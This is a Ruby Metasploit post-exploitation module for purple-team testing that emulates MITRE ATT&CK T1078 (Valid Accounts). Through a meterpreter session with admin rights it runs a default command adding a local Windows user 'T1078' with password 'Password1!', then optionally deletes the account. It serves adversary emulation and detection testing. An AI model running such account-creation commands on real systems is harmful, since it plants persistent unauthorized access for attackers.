##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Msf::Post::Windows::Accounts

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Valid Accounts (T1078) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion, Persistence, Privilege Escalation, Initial Access:
                        Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access.

                        Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

                        Adversaries may also create accounts, sometimes using pre-defined account names and passwords, as a means for persistence through backup access in case other means are unsuccessful.

                        The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1078' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("CMD", [ true, "Command to execute with CMD.", 'net user T1078 Password1! /add']),
      OptBool.new("CLEANUP", [ true, "Clean-up after execution?", true]),
      OptString.new("CLEANUPCMD", [ true, "Cleanup command to execute with CMD.", 'net user T1078 /delete'])
    ])
  end

  def run
    begin
      raise "Module requires meterpreter session" if session.type != "meterpreter"
      fail_with(Failure::NoAccess, "The current session does not have administrative rights.") unless is_admin?

      cmd = datastore['CMD']
      cleanup = datastore['CLEANUP']
      cleanup_cmd = datastore['CLEANUPCMD']

      res = run_cmd(cmd)

      # cleanup
      if cleanup
        res = run_cmd(cleanup_cmd)
      end

      print_good("Module T1078W execution successful.")

    rescue ::Exception => e
        print_error("#{e.class}: #{e.message}")
        print_error("Module T1078W execution failed.")
    end
  end

end
